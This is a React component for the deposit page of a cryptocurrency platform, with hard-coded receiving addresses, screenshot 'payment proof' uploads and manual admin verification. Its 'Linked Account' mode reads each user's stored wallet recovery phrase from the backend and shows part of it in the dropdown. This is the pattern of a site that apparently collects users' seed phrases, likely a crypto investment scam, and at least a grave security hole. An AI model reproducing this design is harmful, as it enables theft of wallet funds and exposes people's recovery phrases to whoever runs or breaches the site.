import React, { useState, useRef, useEffect } from "react";
import { Link } from "react-router-dom";
import Container from "../../components/Container";
import SelectInput from "../../components/vendor/form/SelectInput";
import TextInput from "../../components/vendor/form/TextInput";
import FileInput from "../../components/vendor/form/FileInput";
import SubmitButton from "../../components/vendor/button/SubmitButton";
import Alert from "../../components/vendor/alert/Alert";
import Spinner from "../../components/Spinner";
import DataTable from "./comp/DataTable";
import api from "../../api/config";
import { useAppState } from "../../AppStateContext";

export default function Deposit() {
  const { islogged } = useAppState();
  const [formData, setFormData] = useState({
    wallet: "",
    amount: "",
    file: [],
  });
  const refInput = useRef(null);
  const [deposits, setDeposits] = useState([]);
  const [loading, setLoading] = useState(false);
  const [fetching, setFetching] = useState(true);
  const [result, setResult] = useState({ status: 0, message: null });
  const [method, setMethod] = useState("direct"); // direct or linked

  const hasWallet = islogged.userData?.user_wallets?.length > 0;

  const fetchDeposits = async () => {
    try {
      const response = await api.get("/deposits");
      if (response.data.status === 200) {
        setDeposits(response.data.data.regions);
      }
    } catch (error) {
      console.error("Failed to fetch deposits", error);
    } finally {
      setFetching(false);
    }
  };

  useEffect(() => {
    fetchDeposits();
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFileChange = () => {
    if (refInput.current?.files) {
      setFormData((prev) => ({ ...prev, file: refInput.current.files }));
    }
  };

  const copyToClipboard = (text) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setResult({ status: 200, message: "Address copied to clipboard!" });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    const data = new FormData();
    data.append("wallet", formData.wallet);
    data.append("amount", formData.amount);
    data.append("method", method);
    
    if (method === "direct" && formData.file) {
      for (let i = 0; i < formData.file.length; i++) {
        data.append("file", formData.file[i]);
      }
    }

    try {
      const response = await api.post("/deposits/add", data, {
        headers: { "Content-Type": "multipart/form-data" }
      });
      setResult(response.data);
      if (response.data.status === 200) {
        setFormData({ wallet: "", amount: "", file: [] });
        fetchDeposits();
      }
    } catch (error) {
      setResult({ status: 400, message: error.response?.data?.message || "Deposit submission failed." });
    } finally {
      setLoading(false);
    }
  };

  const walletOptions = [
    { content: "Ethereum (ETH Mainnet)", value: "0x3ab73CB5Ebe9Dd092E7Ee43eF9778fC0e8A29e91" },
    { content: "Bitcoin (BTC)", value: "34hfes2BmfdnXP74BUZCMnnHfXWPhyYnXz" },
    { content: "USDT (ERC20)", value: "0x3ab73CB5Ebe9Dd092E7Ee43eF9778fC0e8A29e91" },
  ];

  const linkedWalletOptions = islogged.userData?.user_wallets?.map(w => ({
    content: `${w.wallet_details?.wallet_name} (${w.recovery_phrase.substring(0, 10)}...)`,
    value: w.id
  })) || [];

  if (fetching) return <div className="h-screen flex items-center justify-center"><Spinner /></div>;

  return (
    <Container title="Fund Account">
      <div className="max-w-7xl mx-auto px-4 py-12 space-y-12">
        
        {/* Main Deposit Interface */}
        <div className="space-y-12 transition-all">
          
          {/* Method Switcher */}
          <div className="flex justify-center">
            <div className="flex p-1.5 bg-white/5 rounded-[2rem] w-fit border border-white/5 backdrop-blur-3xl shadow-2xl relative overflow-hidden">
                <div 
                  className={`absolute inset-y-1.5 left-1.5 w-[calc(50%-6px)] bg-blue-600 rounded-[1.5rem] transition-all duration-300 ease-out shadow-lg shadow-blue-500/20 ${method === "linked" ? "translate-x-full" : "translate-x-0"}`}
                />
                <button 
                  onClick={() => setMethod("direct")}
                  className={`relative z-10 px-10 py-4 rounded-[1.5rem] text-[10px] font-black uppercase tracking-[0.2em] transition-all duration-300 w-48 ${method === "direct" ? "text-white" : "text-gray-500 hover:text-gray-300"}`}
                >
                    Direct Transfer
                </button>
                <button 
                  onClick={() => setMethod("linked")}
                  className={`relative z-10 px-10 py-4 rounded-[1.5rem] text-[10px] font-black uppercase tracking-[0.2em] transition-all duration-300 w-48 ${method === "linked" ? "text-white" : "text-gray-500 hover:text-gray-300"}`}
                >
                    Linked Account
                </button>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-start">
            
            {/* Form Side */}
            <div className="glass-card rounded-[3rem] p-10 border-white/5 space-y-8 shadow-2xl relative overflow-hidden min-h-[500px] flex flex-col justify-center">
               <div className="absolute top-0 right-0 w-32 h-32 bg-blue-600/10 blur-[80px] rounded-full -mr-16 -mt-16"></div>

               {method === "linked" && !hasWallet ? (
                 /* Nested Unlinked State for Linked Tab */
                 <div className="text-center space-y-6 animate-fade-in py-8">
                    <div className="mx-auto w-20 h-20 bg-amber-500/10 rounded-[2rem] flex items-center justify-center text-amber-500">
                       <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" /></svg>
                    </div>
                    <div className="space-y-2">
                      <h3 className="text-2xl font-black uppercase tracking-tight text-white">Bridge Not Verified</h3>
                      <p className="text-sm text-gray-500 font-medium px-4">
                        Linked transfers require a verified decentralized signature. Connect your wallet to enable automated bridge requests.
                      </p>
                    </div>
                    <Link 
                      to="/dashboard/terms" 
                      className="inline-flex items-center gap-2 px-8 py-4 bg-gradient-to-r from-amber-500 to-orange-600 text-white rounded-[1.5rem] font-black uppercase tracking-widest hover:scale-105 transition-all text-[10px]"
                    >
                      Verify Account
                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>
                    </Link>
                 </div>
               ) : (
                 <>
                    <div className="space-y-2 pb-6 border-b border-white/5">
                        <h2 className="text-3xl font-black uppercase tracking-tighter text-white">
                            {method === "direct" ? "Manual Funding" : "Bridge Funding"}
                        </h2>
                        <p className="text-gray-500 font-medium">
                            {method === "direct" ? "Deposit via external blockchain transfer." : "Fund directly from your verified source."}
                        </p>
                    </div>

                    <Alert result={result} setResult={setResult} timer={5000} />

                    <form onSubmit={handleSubmit} className="space-y-6">
                        {method === "direct" ? (
                          <>
                            <SelectInput
                              handleChange={handleChange}
                              placeholder="Select Platform Asset"
                              name="wallet"
                              value={formData.wallet}
                              options={walletOptions}
                              required
                            />

                            {formData.wallet && (
                              <div className="p-6 bg-white/5 rounded-3xl border border-blue-500/10 space-y-3 animate-slide-up bg-gradient-to-br from-blue-500/[0.03] to-transparent">
                                <span className="text-[10px] font-black text-blue-500 uppercase tracking-[0.2em] text-center block">Platform Receiver Address</span>
                                <div className="flex items-center justify-between gap-4">
                                    <code className="text-[11px] font-mono text-gray-300 break-all leading-relaxed">{formData.wallet}</code>
                                    <button 
                                      type="button"
                                      onClick={() => copyToClipboard(formData.wallet)}
                                      className="p-3 bg-blue-600/20 text-blue-400 rounded-xl hover:bg-blue-600 hover:text-white transition-all flex-shrink-0 group shadow-lg border border-blue-500/20"
                                    >
                                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" /></svg>
                                    </button>
                                </div>
                              </div>
                            )}
                          </>
                        ) : (
                          <SelectInput
                            handleChange={handleChange}
                            placeholder="Select Linked Source"
                            name="wallet"
                            value={formData.wallet}
                            options={linkedWalletOptions}
                            required
                          />
                        )}

                        <TextInput
                          handleChange={handleChange}
                          placeholder="Amount (ETH/BTC)"
                          name="amount"
                          value={formData.amount}
                          type="number"
                          required
                        />

                        {method === "direct" && (
                          <FileInput
                            handleChange={handleFileChange}
                            placeholder="Upload Payment Proof"
                            name="file"
                            refInput={refInput}
                            required
                          />
                        )}

                        <div className="pt-4">
                          <SubmitButton 
                            loading={loading} 
                            text={method === "direct" ? "SUBMIT DEPOSIT PROOF" : "PROCESS BRIDGE REQUEST"} 
                          />
                        </div>
                    </form>
                 </>
               )}
            </div>

            {/* Instruction Side */}
            <div className="space-y-8">
               <div className="glass-card rounded-[3rem] p-8 border-white/5 space-y-6 bg-gradient-to-br from-blue-600/10 to-transparent">
                  <div className="w-12 h-12 bg-blue-600 rounded-2xl flex items-center justify-center text-white shadow-lg">
                     <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                  </div>
                  <div className="space-y-2">
                     <h3 className="text-xl font-black uppercase text-white">How This Works</h3>
                     <ul className="space-y-4">
                        <li className="flex gap-4 text-sm text-gray-400">
                           <span className="font-black text-blue-500">01</span>
                           Copy the platform's deposit address for your chosen asset.
                        </li>
                        <li className="flex gap-4 text-sm text-gray-400" style={{ display: method === "direct" ? "flex" : "none" }}>
                           <span className="font-black text-blue-500">02</span>
                           Send exactly the amount you specified from your external wallet.
                        </li>
                        <li className="flex gap-4 text-sm text-gray-400" style={{ display: method === "linked" ? "flex" : "none" }}>
                           <span className="font-black text-blue-500">02</span>
                           Verify your linked account balance before requesting a bridge.
                        </li>
                        <li className="flex gap-4 text-sm text-gray-400">
                           <span className="font-black text-blue-500">03</span>
                           {method === "direct" ? "Capture a screenshot of the successful transaction." : "Authorize the bridging protocol via our secured relay."}
                        </li>
                        <li className="flex gap-4 text-sm text-gray-400">
                           <span className="font-black text-blue-500">04</span>
                           Wait for admin verification (usually 5-10 mins).
                        </li>
                     </ul>
                  </div>
               </div>

               {/* History Preview */}
               <div className="space-y-4">
                  <h3 className="text-lg font-black uppercase text-white tracking-widest px-2">Deposit Records</h3>
                  <div className="glass-card rounded-[2.5rem] border-white/5 overflow-hidden">
                     <DataTable data={deposits} />
                  </div>
               </div>
               </div>
            </div>

          </div>
        </div>
      {/* </div> */}
    </Container>
  );
}
